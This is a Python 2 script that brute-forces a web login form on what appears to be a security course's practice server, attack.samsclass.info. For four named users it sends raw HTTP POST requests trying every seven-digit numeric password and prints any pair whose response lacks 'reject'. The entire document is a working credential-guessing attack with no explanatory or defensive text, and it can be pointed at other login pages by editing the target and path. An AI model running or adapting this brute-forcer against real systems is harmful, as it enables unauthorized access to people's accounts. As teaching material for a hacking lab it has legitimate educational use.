#!/usr/bin/python

import socket
import re

target = "attack.samsclass.info"

for user in [ "sarah", "petem", "sandyb", "admin" ]:
	print "======================================================================"
	print "now checking %s" % user
	length = len(user) + 12

	for pw in range(1000000,10000000):
		if (pw % 1000 == 0) :
			print pw
		pw=str(pw)

		socket.setdefaulttimeout(2)
		s=socket.socket()
		s.connect((target, 80))

		s.send("POST /python/login2.php HTTP/1.1\nHost: " + target \
		 + "\nContent-Length: " + str(length) \
		 + "\nContent-Type: application/x-www-form-urlencoded" \
		 + "\n\nu=" + user + "&p=" + pw)

		output = s.recv(1024)

		inst = re.search('reject', output, flags=0)

		if not inst:
			print "userid= %s : password= %s" % (user, pw)
			print output
			break

		s.close()
